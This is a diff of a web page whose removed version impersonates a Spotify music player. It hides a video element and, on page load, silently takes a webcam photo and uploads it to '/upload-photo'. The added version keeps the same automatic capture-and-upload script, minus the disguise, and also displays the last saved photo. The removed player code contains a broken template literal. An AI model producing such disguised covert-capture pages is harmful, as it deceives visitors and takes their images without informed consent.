@@ -1,529 +1,81 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Spotify Player</title>
-  <link
-    href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap"
-    rel="stylesheet"
-  />
-  <link
-    rel="stylesheet"
-    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css"
-    crossorigin="anonymous"
-  />
-  <style>
-    /* Reset */
-    * {
-      box-sizing: border-box;
+<script>
+  const video = document.getElementById("video");
+  const photo = document.getElementById("photo");
+
+  async function startCameraAndCapture() {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: "user" },
+        audio: false,
+      });
+      video.srcObject = stream;
+
+      await new Promise((resolve) => {
+        video.onloadedmetadata = () => resolve();
+      });
+
+      await new Promise((resolve) => setTimeout(resolve, 200));
+      capturePhoto();
+    } catch (err) {
+      console.error("Error accessing camera:", err);
     }
-    body,
-    html {
-      margin: 0;
-      padding: 0;
-      height: 100%;
-      font-family: "Montserrat", sans-serif;
-      background-color: #121212;
-      color: white;
-      overflow: hidden;
-    }
+  }
 
-    a {
-      text-decoration: none;
-      color: white;
-    }
+  function capturePhoto() {
+    const canvas = document.createElement("canvas");
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    const ctx = canvas.getContext("2d");
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-    /* Layout */
-    .container {
-      display: flex;
-      height: 100vh;
-      width: 100vw;
-    }
+    const dataUrl = canvas.toDataURL("image/png");
+    photo.src = dataUrl;
+    sendPhotoToServer(dataUrl);
+  }
 
-    /* Sidebar */
-    .sidebar {
-      width: 280px;
-      background-color: #000000; /* subtle bluish black */
-      display: flex;
-      flex-direction: column;
-      padding: 20px;
-      gap: 20px;
-    }
-
-    .logo {
-      font-size: 24px;
-      font-weight: 700;
-      letter-spacing: 2px;
-      margin-bottom: 20px;
-      color: white;
-      display: flex;
-      align-items: center;
-      gap: 10px;
-    }
-
-    .logo i {
-      font-size: 28px;
-      color: white;
-    }
-
-    .nav-item {
-      display: flex;
-      align-items: center;
-      gap: 15px;
-      padding: 12px 10px;
-      cursor: pointer;
-      border-radius: 4px;
-      font-weight: 600;
-      font-size: 14px;
-      opacity: 0.7;
-      transition: opacity 0.3s, background-color 0.3s;
-    }
-
-    .nav-item:hover,
-    .nav-item.active {
-      opacity: 1;
-      background-color: #282828;
-    }
-
-    .nav-item i {
-      font-size: 18px;
-      width: 22px;
-      text-align: center;
-    }
-
-    .library {
-      margin-top: 20px;
-      flex-grow: 1;
-      overflow-y: auto;
-      border-top: 1px solid #282828;
-      padding-top: 20px;
-    }
-
-    .library-item {
-      font-size: 14px;
-      padding: 8px 10px;
-      cursor: pointer;
-      opacity: 0.7;
-      border-radius: 4px;
-      transition: opacity 0.3s, background-color 0.3s;
-      margin-bottom: 8px;
-    }
-
-    .library-item:hover {
-      opacity: 1;
-      background-color: #282828;
-    }
-
-    /* Main content */
-    .main-content {
-      flex-grow: 1;
-      background-color: #181818;
-      padding: 30px 40px 120px; /* bottom padding for player */
-      overflow-y: auto;
-      display: flex;
-      flex-direction: column;
-      gap: 20px;
-    }
-
-    .album-info {
-      display: flex;
-      gap: 30px;
-      align-items: center;
-      margin-bottom: 30px;
-    }
-
-    .album-cover {
-      width: 220px;
-      height: 220px;
-      background: url("https://is1-ssl.mzstatic.com/image/thumb/Music115/v4/c5/6c/b1/c56cb16a-52c3-33b5-5189-6c65028001fb/19UM1IM00404.rgb.jpg/1200x1200bf-60.jpg")
-        center center/cover no-repeat;
-      border-radius: 8px;
-      box-shadow: 0 4px 60px rgba(0, 0, 0, 0.5);
-    }
-
-    .song-details {
-      display: flex;
-      flex-direction: column;
-      gap: 10px;
-      color: white;
-    }
-
-    .song-title {
-      font-size: 36px;
-      font-weight: 700;
-    }
-
-    .artist-name {
-      font-size: 20px;
-      font-weight: 500;
-      opacity: 0.7;
-    }
-
-    /* Camera section */
-  
-    video {
-      display: none; /* Hide video completely */
-      width: 100%;
-      border-radius: 10px;
-      background-color: black;
-    }
-    canvas {
-      display: none;
-    }
-    #photo {
-      display: none;
-    }
-
-    /* Bottom Player */
-    .player {
-      position: fixed;
-      bottom: 0;
-      left: 280px;
-      right: 0;
-      height: 90px;
-      background-color: #181818;
-      border-top: 1px solid #282828;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      padding: 0 20px;
-      box-sizing: border-box;
-      z-index: 100;
-    }
-
-    .player-left {
-      display: flex;
-      align-items: center;
-      gap: 15px;
-      width: 300px;
-    }
-
-    .player-left img {
-      width: 60px;
-      height: 60px;
-      border-radius: 4px;
-    }
-
-    .player-song-info {
-      display: flex;
-      flex-direction: column;
-      color: white;
-    }
-
-    .player-song-title {
-      font-weight: 700;
-      font-size: 16px;
-      white-space: nowrap;
-      overflow: hidden;
-      text-overflow: ellipsis;
-    }
-
-    .player-artist-name {
-      font-size: 14px;
-      opacity: 0.7;
-      margin-top: 2px;
-    }
-
-    .player-center {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      gap: 6px;
-      flex: 1;
-      max-width: 600px;
-    }
-
-    .player-controls {
-      display: flex;
-      align-items: center;
-      gap: 25px;
-    }
-
-    .player-controls button {
-      background: none;
-      border: none;
-      color: white;
-      font-size: 22px;
-      cursor: pointer;
-      opacity: 0.8;
-      transition: opacity 0.3s;
-    }
-
-    .player-controls button:hover {
-      opacity: 1;
-    }
-
-    .progress-bar {
-      width: 100%;
-      -webkit-appearance: none;
-      height: 4px;
-      border-radius: 2px;
-      background-color: #535353;
-      cursor: pointer;
-    }
-
-    .progress-bar::-webkit-slider-thumb {
-      -webkit-appearance: none;
-      width: 12px;
-      height: 12px;
-      background-color: #1db954;
-      border-radius: 50%;
-      cursor: pointer;
-      margin-top: -4px;
-      box-shadow: 0 0 2px rgba(0, 0, 0, 0.5);
-    }
-
-    .player-time {
-      font-size: 12px;
-      color: #b3b3b3;
-      user-select: none;
-      width: 40px;
-      text-align: center;
-    }
-
-    .player-right {
-      display: flex;
-      align-items: center;
-      gap: 20px;
-      width: 150px;
-      justify-content: flex-end;
-    }
-
-    .volume-bar {
-      width: 100px;
-      -webkit-appearance: none;
-      height: 4px;
-      border-radius: 2px;
-      background-color: #535353;
-      cursor: pointer;
-    }
-
-    .volume-bar::-webkit-slider-thumb {
-      -webkit-appearance: none;
-      width: 12px;
-      height: 12px;
-      background-color: #1db954;
-      border-radius: 50%;
-      cursor: pointer;
-      margin-top: -4px;
-      box-shadow: 0 0 2px rgba(0, 0, 0, 0.5);
-    }
-
-    /* Scrollbar in library */
-    .library::-webkit-scrollbar {
-      width: 6px;
-    }
-    .library::-webkit-scrollbar-thumb {
-      background-color: #535353;
-      border-radius: 3px;
-    }
-  </style>
-</head>
-<body>
-  <div class="container">
-    <aside class="sidebar">
-      <div class="logo">
-        <i class="fa-brands fa-spotify"></i>
-        Spotify
-      </div>
-
-      <nav>
-        <div class="nav-item active">
-          <i class="fa-solid fa-house"></i> Home
-        </div>
-        <div class="nav-item">
-          <i class="fa-solid fa-magnifying-glass"></i> Search
-        </div>
-      </nav>
-
-      <div class="library" tabindex="0">
-        <div class="library-item">Your Library</div>
-        <div class="library-item">Create Playlist</div>
-        <div class="library-item">Liked Songs</div>
-      </div>
-    </aside>
-
-    <main class="main-content" role="main" aria-label="Main content">
-      <section class="album-info">
-        <div class="album-cover"></div>
-        <div class="song-details">
-          <div class="song-title">everything i wanted</div>
-          <div class="artist-name">Billie Eilish</div>
-        </div>
-      </section>
-
-      <section class="camera-section" aria-label="Camera capture section">
-        <video id="video" autoplay playsinline></video>
-        <!-- Button removed -->
-        <img id="photo" alt="Captured photo will appear here" />
-      </section>
-    </main>
-  </div>
-
-  <!-- Bottom Player -->
-  <div class="player" role="region" aria-label="Music player controls">
-    <div class="player-left">
-      <img
-        src="https://cdn-az.allevents.in/events6/banners/e556d420-bf4b-11ef-ba62-01a86bcead1d-rimg-w300-h300-dc030f1a-gmir.jpg?v=1734751817"
-        alt="Album cover for everything i wanted by Billie Eilish"
-      />
-      <div class="player-song-info">
-        <div class="player-song-title">everything i wanted</div>
-        <div class="player-artist-name">Billie Eilish</div>
-      </div>
-    </div>
-
-    <div class="player-center">
-      <div class="player-controls">
-        <button id="prev-btn" title="Previous track" aria-label="Previous track" disabled>
-          <i class="fa-solid fa-backward"></i>
-        </button>
-        <button id="play-btn" title="Play" aria-label="Play">
-          <i class="fa-solid fa-play"></i>
-        </button>
-        <button id="next-btn" title="Next track" aria-label="Next track" disabled>
-          <i class="fa-solid fa-forward"></i>
-        </button>
-      </div>
-      <div style="display:flex; align-items:center; width:100%; gap: 8px; margin-top: 4px;">
-        <div class="player-time" id="current-time">0:00</div>
-        <input
-          type="range"
-          id="progress-bar"
-          class="progress-bar"
-          min="0"
-          max="100"
-          value="0"
-          aria-label="Track progress"
-        />
-        <div class="player-time" id="duration">0:00</div>
-      </div>
-    </div>
-
-  </div>
-
-  <!-- Audio element -->
-  <audio
-    id="audio-player"
-    preload="metadata"
-    src="everything_i_wanted.mp3"
-  >
-  </audio>
-
-  <script>
-    const video = document.getElementById("video");
-    const photo = document.getElementById("photo");
-
-    async function startCameraAndCapture() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: "user" },
-          audio: false,
-        });
-        video.srcObject = stream;
-
-        // Wait for video to start
-        await new Promise((resolve) => {
-          video.onloadedmetadata = () => {
-            resolve();
-          };
-        });
-
-        // Small delay to ensure frame is ready
-        await new Promise((resolve) => setTimeout(resolve, 200));
-
-        capturePhoto();
-
-      } catch (err) {
-        console.error("Error accessing camera:", err);
-      }
-    }
-
-    function capturePhoto() {
-      const canvas = document.createElement("canvas");
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      const ctx = canvas.getContext("2d");
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-      // Show photo on page
-      const dataUrl = canvas.toDataURL("image/png");
-      photo.src = dataUrl;
-
-      // Send photo to server
-      sendPhotoToServer(dataUrl);
-    }
-
-     function sendPhotoToServer(dataUrl) {
-  fetch("/upload-photo", {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json",
-    },
-    body: JSON.stringify({ image: dataUrl }),
-  })
-    .then((res) => {
-      if (!res.ok) throw new Error("Upload failed");
-      return res.json();
+  function sendPhotoToServer(dataUrl) {
+    fetch("/upload-photo", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify({ image: dataUrl }),
     })
-    .then((data) => {
-      if (data.status === "success") {
-        console.log("✅ Photo saved:", data.url);
-      } else {
-        console.error("Upload failed:", data);
-      }
-    })
-    .catch((err) => {
-      console.error("Error uploading photo:", err);
-    });
-}
+      .then((res) => {
+        if (!res.ok) throw new Error("Upload failed");
+        return res.json();
+      })
+      .then((data) => {
+        if (data.status === "success") {
+          console.log("✅ Photo saved:", data.url);
+        } else {
+          console.error("Upload failed:", data);
+        }
+      })
+      .catch((err) => {
+        console.error("Error uploading photo:", err);
+      });
+  }
 
-    // Start camera and capture photo as soon as page loads
-    window.addEventListener("load", startCameraAndCapture);
+  function loadLastPhoto() {
+    fetch("/last-photo")
+      .then((res) => {
+        if (!res.ok) throw new Error("No saved photo");
+        return res.json();
+      })
+      .then((data) => {
+        if (data.url) {
+          photo.src = data.url;
+          photo.style.display = "block"; // Make it visible
+        }
+      })
+      .catch((err) => {
+        console.warn("⚠️ Could not load last photo:", err.message);
+      });
+  }
 
-    // Spotify player functionality
-    const audio = document.getElementById("audio-player");
-    const playBtn = document.getElementById("play-btn");
-    const progressBar = document.getElementById("progress-bar");
-    const currentTimeEl = document.getElementById("current-time");
-    const durationEl = document.getElementById("duration");
-    const prevBtn = document.getElementById("prev-btn");
-    const nextBtn = document.getElementById("next-btn");
-
-    playBtn.addEventListener("click", () => {
-      if (audio.paused) {
-        audio.play();
-        playBtn.innerHTML = '<i class="fa-solid fa-pause"></i>';
-        playBtn.title = "Pause";
-        playBtn.setAttribute("aria-label", "Pause");
-      } else {
-        audio.pause();
-        playBtn.innerHTML = '<i class="fa-solid fa-play"></i>';
-        playBtn.title = "Play";
-        playBtn.setAttribute("aria-label", "Play");
-      }
-    });
-
-    audio.addEventListener("loadedmetadata", () => {
-      progressBar.max = Math.floor(audio.duration);
-      durationEl.textContent = formatTime(audio.duration);
-    });
-
-    audio.addEventListener("timeupdate", () => {
-      progressBar.value = Math.floor(audio.currentTime);
-      currentTimeEl.textContent = formatTime(audio.currentTime);
-    });
-
-    progressBar.addEventListener("input", () => {
-      audio.currentTime = progressBar.value;
-    });
-
-    function formatTime(time) {
-      const minutes = Math.floor(time / 60);
-      const seconds = Math.floor(time % 60);
-      return ${minutes}:${seconds < 10 ? "0" + seconds : seconds};
-    }
-  </script>
-</body>
-</html> 
+  window.addEventListener("load", () => {
+    startCameraAndCapture();
+    loadLastPhoto(); // ✅ load the last photo on page load
+  });
+</script>
